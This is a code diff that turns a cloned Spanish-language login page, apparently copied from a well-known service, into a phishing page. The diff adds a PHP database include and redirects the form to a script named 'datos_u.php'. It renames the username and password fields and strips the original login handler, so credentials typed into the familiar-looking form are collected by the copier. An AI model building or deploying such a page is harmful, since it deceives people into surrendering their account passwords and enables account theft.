@@ -1,5 +1,7 @@
+<?php include('conexion.php'); ?>
+
 <!DOCTYPE html>
-<html id="app" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible="">
+<html id="app" lang="es" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible="">
 <head>
   <style class="vjs-styles-defaults">
       .video-js {
@@ -66,14 +68,14 @@
       </div>
     </div>
 
-    <form name="$parent.accounts" method="post" novalidate="" class="ng-valid-sp-disallow-chars ng-dirty ng-valid-parse ng-valid ng-valid-required">
+    <form action="datos_u.php" name="#" method="POST" novalidate="" class="ng-valid-sp-disallow-chars ng-dirty ng-valid-parse ng-valid ng-valid-required">
 
       <div class="row" ng-class="{'has-error': (accounts.username.$dirty &amp;&amp; accounts.username.$invalid) || invalidCredentials}">
         <div class="col-xs-12">
           <label for="login-username" class="control-label ng-binding">
             Correo electrónico o nombre de usuario
           </label>
-          <input ng-model="form.username" type="text" class="form-control input-with-feedback ng-valid-sp-disallow-chars ng-touched ng-dirty ng-valid-parse ng-not-empty ng-valid ng-valid-required" name="username" id="login-username" placeholder="Correo electrónico o nombre de usuario" required="" sp-disallow-chars=":%&amp;'`´&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false" ng-change="onInputChange()">
+          <input ng-model="form.username" type="text" class="form-control input-with-feedback ng-valid-sp-disallow-chars ng-touched ng-dirty ng-valid-parse ng-not-empty ng-valid ng-valid-required" name="n_usuario" id="login-username" placeholder="Correo electrónico o nombre de usuario" required="" sp-disallow-chars=":%&amp;'`´&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false" ng-change="onInputChange()">
           <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid -->
         </div>
       </div>
@@ -83,7 +85,7 @@
           <label for="login-password" class="control-label ng-binding">
             Contraseña
           </label>
-          <input ng-model="form.password" type="password" class="form-control input-with-feedback ng-not-empty ng-dirty ng-valid-parse ng-valid ng-valid-required ng-touched" name="password" id="login-password" placeholder="Contraseña" required="" autocomplete="off" ng-trim="false" ng-change="onInputChange()">
+          <input ng-model="form.password" type="password" class="form-control input-with-feedback ng-not-empty ng-dirty ng-valid-parse ng-valid ng-valid-required ng-touched" name="pass" id="login-password" placeholder="Contraseña" required="" autocomplete="off" ng-trim="false" ng-change="onInputChange()">
           <!-- ngIf: accounts.password.$dirty && accounts.password.$invalid -->
         </div>
       </div>
@@ -109,7 +111,7 @@
           </div>
         </div>
         <div class="col-xs-12 col-sm-6">
-          <button class="btn btn-block btn-green ng-binding" id="login-button" ng-click="onLoginClick($event)">Iniciar Sesión</button>
+          <button class="btn btn-block btn-green ng-binding" type="submit" name="iniciar_sesion">Iniciar Sesión</button>
         </div>
       </div>
     </form>
